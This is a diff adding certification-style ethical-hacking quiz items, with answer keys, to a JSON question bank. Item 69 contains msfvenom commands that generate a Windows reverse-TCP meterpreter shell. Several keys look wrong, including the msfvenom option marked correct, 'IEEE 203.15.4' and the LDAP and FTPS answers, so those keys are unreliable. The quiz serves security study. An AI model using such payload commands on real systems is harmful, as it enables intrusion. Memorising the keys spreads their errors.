@@ -1019,8 +1019,6 @@
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:33:00"
   },
-
-
   {
     "id": 31,
     "question": "You need to identify the OS of the target host. You want to use the Unicornscan tool to do this. As a result of using the tool, you got the TTL value and determined that the target system is running a Windows OS. Which of the following TTL values did you get when using the program?",
@@ -2040,5 +2038,1025 @@
     ],
     "multipleCorrect": false,
     "createdAt": "2025-12-26T19:40:00"
+  },
+  {
+    "id": 61,
+    "question": "Which of the following vulnerabilities will you use if you know that the target network uses WPA3 encryption?",
+    "category": "Wireless Security",
+    "image": null,
+    "answers": [
+      {
+        "text": "Cross-site request forgery",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Dragonblood",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "AP misconfiguration",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Key reinstallation attack",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 62,
+    "question": "During a port scan on the target host, your colleague sends FIN/ACK probes and finds that an RST packet is sent in response by the target host, indicating that the port is closed. Which of the following port scanning techniques did your colleague use?",
+    "category": "Scanning",
+    "image": null,
+    "answers": [
+      {
+        "text": "Xmas scan",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "ACK flag probe scan",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "TCP Maimon scan",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "IDLE/IPID header scan",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 63,
+    "question": "During the scan, you found a serious vulnerability, compiled a report and sent it to your colleagues. In response, you received proof that they fixed this vulnerability a few days ago. How can you characterize this vulnerability?",
+    "category": "Vulnerability Analysis",
+    "image": null,
+    "answers": [
+      {
+        "text": "False-positive",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "False-true",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "True-false",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "False-negative",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 64,
+    "question": "Which of the following rootkit types sits undetected in the core components of the operating system?",
+    "category": "Malware",
+    "image": null,
+    "answers": [
+      {
+        "text": "Hypervisor rootkit",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Kernel rootkit",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Firmware rootkit",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Hardware rootkit",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 65,
+    "question": "Your organization has a public key infrastructure set up. Your colleague Bernard wants to send a message to Joan. Therefore, Bernard both encrypts the message and digitally signs it. Bernard uses ________ to encrypt the message for these purposes, and Joan uses ________ to confirm the digital signature.",
+    "category": "Cryptography",
+    "image": null,
+    "answers": [
+      {
+        "text": "Joan's public key; Bernard's public key.",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Bernard's public key; Bernard's public key.",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Joan's public key; Joan's public key.",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Joan's private key; Bernard's public key.",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 66,
+    "question": "A post-breach forensic investigation revealed that a known vulnerability in Apache Struts was to blame for the Equifax data breach. At the same time a fix was available from the software vendor for several months before the intrusion. In which of the following security processes has failed?",
+    "category": "Vulnerability Management",
+    "image": null,
+    "answers": [
+      {
+        "text": "Patch management",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Vendor risk management",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Security awareness training",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Secure development lifecycle",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 67,
+    "question": "Ivan decided to use Nmap to scan open ports and running services on systems connected to an OT network. Which of the following commands identifies Ethernet/IP devices and gathers information such as vendor name, product code, and device name?",
+    "category": "Scanning",
+    "image": null,
+    "answers": [
+      {
+        "text": "nmap -Pn -sT --scan-delay 1s --max-parallelism 1 -p < Port List > < Target IP >",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "nmap -Pn -sT -p 46824 < Target IP >",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "nmap -Pn -sT -p 102 --script s7-info < Target IP >",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "nmap -Pn -sU -p 44818 --script enip-info < Target IP >",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 68,
+    "question": "Which of the following protocols is short-range, based on the IEEE 203.15.4 standard, with a range of 10-100m, and designed for small-scale projects needing wireless connection?",
+    "category": "IoT Security",
+    "image": null,
+    "answers": [
+      {
+        "text": "MQTT",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Zigbee",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "LPWAN",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "NB-IoT",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 69,
+    "question": "Which of the following is a correct example of using msfvenom to generate a reverse TCP shellcode for Windows?",
+    "category": "Hacking Tools",
+    "image": null,
+    "answers": [
+      {
+        "text": "msfvenom -p windows/meterpreter/reverse_tcp RHOST 10.10.10.12 LPORT=8888 -f c",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "msfvenom -p windows/meterpreter/reverse_tcp RHOST 10.10.10.12 LPORT=8888 -f exe > shell.exe",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.12 LPORT=8888 -f c",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "msfvenom -p windows/meterpreter/reverse_tcp LHOST 10.10.10.12 LPORT=8888 -f exe > shell.exe",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 70,
+    "question": "Which of the following tools can be used to retrieve an organization's network range, identify network topology, and the operating systems used by entering a server IP address?",
+    "category": "Footprinting",
+    "image": null,
+    "answers": [
+      {
+        "text": "Baidu",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "AOL",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "ARIN",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "DuckDuckGo",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 71,
+    "question": "Which of the following ports must you block first in case that you are suspicious that an loT device has been compromised by Mirai malware?",
+    "category": "IoT Security",
+    "image": null,
+    "answers": [
+      {
+        "text": "8080",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "22",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "80",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "48101",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 72,
+    "question": "You performed a tool-based vulnerability assessment and found that some identified issues are not true vulnerabilities. How can you characterize these issues?",
+    "category": "Vulnerability Analysis",
+    "image": null,
+    "answers": [
+      {
+        "text": "True positives",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "True negatives",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "False positives",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "False negatives",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 73,
+    "question": "Antonio used a technique to encode packets with Unicode characters so that the IDS cannot recognize them, but the target web server can decode them. Which technique is this?",
+    "category": "IDS Evasion",
+    "image": null,
+    "answers": [
+      {
+        "text": "Obfuscating",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Urgency flag",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Session splicing",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Desynchronization",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 74,
+    "question": "In the five-tier container technology architecture, at which tier are you working when verifying and validating image contents, signing images, and sending them to registries?",
+    "category": "Cloud Computing",
+    "image": null,
+    "answers": [
+      {
+        "text": "Tier-2: Testing and accreditation systems.",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Tier-3: Registries.",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Tier-4: Orchestrators.",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Tier-1: Developer machines.",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 75,
+    "question": "According to CVSS v3.1 severity ratings, which of the following score ranges is considered 'Medium'?",
+    "category": "Vulnerability Analysis",
+    "image": null,
+    "answers": [
+      {
+        "text": "4.0-6.9",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "4.0-6.0",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "3.0-6.9",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "3.9-6.9",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 76,
+    "question": "Identify the exploit framework whose capabilities include automated attacks on services, ports, applications and unpatched security flaws.",
+    "category": "Hacking Tools",
+    "image": null,
+    "answers": [
+      {
+        "text": "Maltego",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Wireshark",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Nessus",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Metasploit",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 77,
+    "question": "A web server permits SSLv2 and shares a private key with another server that also allows SSLv2. This makes it vulnerable to which attack that can leak key information?",
+    "category": "Cryptography",
+    "image": null,
+    "answers": [
+      {
+        "text": "Padding oracle attack",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "DUHK attack",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Side-channel attack",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "DROWN attack",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 78,
+    "question": "Which of the following NetBIOS codes is used for obtaining the messenger service running for the logged-in user?",
+    "category": "Enumeration",
+    "image": null,
+    "answers": [
+      {
+        "text": "<20>",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "<00>",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "<03>",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "<1B>",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 79,
+    "question": "Jack launched an attack by broadcasting forged DHCP requests to lease all available addresses until the server could not issue more. Which attack did Jack perform?",
+    "category": "Network Attacks",
+    "image": null,
+    "answers": [
+      {
+        "text": "VLAN hopping",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Rogue DHCP server attack",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "STP attack",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "DHCP starvation",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 80,
+    "question": "Which of the following Metasploit Framework tools can be used to bypass antivirus by altering the code in an executable?",
+    "category": "Hacking Tools",
+    "image": null,
+    "answers": [
+      {
+        "text": "msfcli",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "msfpayload",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "msfd",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "msfencode",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 81,
+    "question": "An attacker records frequency commands between IoT devices and later repeats the captured signals to repeat commands. Which attack is this?",
+    "category": "IoT Security",
+    "image": null,
+    "answers": [
+      {
+        "text": "Replay attack.",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Side-channel attack.",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Reconnaissance attack.",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Cryptanalysis attack.",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 82,
+    "question": "Identify the attack: partial HTTP requests are sent to web applications so the target server opens multiple connections and keeps waiting for completion, eventually denying others.",
+    "category": "DoS Attacks",
+    "image": null,
+    "answers": [
+      {
+        "text": "Phlashing",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Session splicing",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Slowloris attack",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Desynchronization",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 83,
+    "question": "Using CVSS v3.0, a vulnerability is assigned a base score of 4.0. What is its severity level?",
+    "category": "Vulnerability Analysis",
+    "image": null,
+    "answers": [
+      {
+        "text": "High",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Low",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Critical",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Medium",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 84,
+    "question": "Which of the following files determines the basic configuration in an Android application, such as broadcast receivers and services?",
+    "category": "Mobile Security",
+    "image": null,
+    "answers": [
+      {
+        "text": "resources.asrc",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "APK.info",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "classes.dex",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "AndroidManifest.xml",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 85,
+    "question": "Which of the following AAA protocols can be used for authenticating users connecting via analog modems, DSL, and VPN over a Frame Relay network?",
+    "category": "Network Security",
+    "image": null,
+    "answers": [
+      {
+        "text": "TACACS",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Kerberos",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "DIAMETER",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "RADIUS",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 86,
+    "question": "Plaintext sharing of usernames and passwords allows for session hijacking. Which of the following protocols uses encryption and digital certificates to help solve this?",
+    "category": "Network Security",
+    "image": null,
+    "answers": [
+      {
+        "text": "IP",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "FTP",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "HTTPS",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "FTPS",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 87,
+    "question": "Which Python-based automated tool can retrieve DNS zone data, including IP addresses, DNS records, and Whois records for reconnaissance?",
+    "category": "Footprinting",
+    "image": null,
+    "answers": [
+      {
+        "text": "Bluto",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "ZANTI",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Towelroot",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Knative",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 88,
+    "question": "Identify the protocol used to secure an LDAP service against anonymous queries.",
+    "category": "Enumeration",
+    "image": null,
+    "answers": [
+      {
+        "text": "SSO",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "NTLM",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "RADIUS",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "WPA",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 89,
+    "question": "Which of the following creates an appealing isolated environment for hackers to gather information about them while preventing them from compromising real targets?",
+    "category": "Hacking Concepts",
+    "image": null,
+    "answers": [
+      {
+        "text": "Firewall",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Intrusion detection system",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Botnet",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "Honeypot",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
+  },
+  {
+    "id": 90,
+    "question": "Which of the following Nmap commands performs a stealth scan (TCP SYN scan)?",
+    "category": "Scanning",
+    "image": null,
+    "answers": [
+      {
+        "text": "nmap -sS",
+        "isCorrect": true,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "nmap -sU",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "nmap -sT",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      },
+      {
+        "text": "nmap -sM",
+        "isCorrect": false,
+        "justification": null,
+        "image": null
+      }
+    ],
+    "multipleCorrect": false,
+    "createdAt": "2025-12-26T19:48:00"
   }
 ]
